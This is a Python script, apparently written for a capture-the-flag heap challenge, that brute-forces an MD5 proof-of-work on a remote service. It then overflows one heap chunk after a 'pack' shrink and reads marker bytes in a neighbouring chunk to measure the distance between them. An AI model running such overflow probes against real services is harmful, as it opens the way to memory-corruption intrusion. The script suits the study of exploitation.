"""514 标定：pack 收缩后 edit 越界，标记字节出现在 B 的哪个偏移 → 得到 A→B 距离。"""
import hashlib
import itertools
import re
import socket
import string
import time

HOST, PORT = "env.xj.edisec.net", 30410


def drain(s, wait=0.7):
    s.settimeout(0.22)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(16384)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


s = socket.create_connection((HOST, PORT), timeout=8)
banner = drain(s, 1.5)
masked = re.search(rb"Token:\s*([A-Za-z_]+)", banner).group(1).decode()
md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", banner).group(1).decode()
s.sendall(solve_pow(md5hex, masked).encode() + b"\n")
drain(s, 1.2)
print("connected:", masked, md5hex)


def cmd(*lines, wait=0.75):
    out = b""
    for ln in lines:
        s.sendall(str(ln).encode() + b"\n")
        out += drain(s, wait)
    return out


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


def show(idx):
    return cmd(3, idx, wait=0.9)


# 1) A：512 全 0x41 → pack 收缩
cmd(1, 0, "A", 512, 512, "41" * 512)
cmd(4, 0)
d = parse(show(0))
print("[A after pack] len=%d cap=%d" % d[:2], "dump[:40]", d[2][:40].hex())

# 2) B：512 全 0x42
cmd(1, 1, "B", 512, 512, "42" * 512)
dB = parse(show(1))
print("[B fresh] len=%d cap=%d" % dB[:2])

# 3) 用 A 溢出写 0x43 标记（先写 64 字节，避免打崩）
r = cmd(2, 0, 64, "43" * 64)
print("[edit A 64B] ->", repr(r[:120]))

# 4) 看 B 里出现标记的位置
dB2 = parse(show(1))
if dB2:
    blob = dB2[2]
    pos = [i for i in range(len(blob) - 1) if blob[i:i + 2] == b"\x43\x43"]
    print("[B after A-ovf] len=%d cap=%d" % dB2[:2], "0x43 起始偏移:", pos[:6])
    print("[B dump[:96]]", blob[:96].hex())
else:
    print("[B after A-ovf] 无响应（可能崩溃）")

dA = parse(show(0))
print("[A] len=%d cap=%d" % dA[:2] if dA else "[A] 无响应", "0x43 计数:", dA[2].count(b"\x43") if dA else "-")
s.close()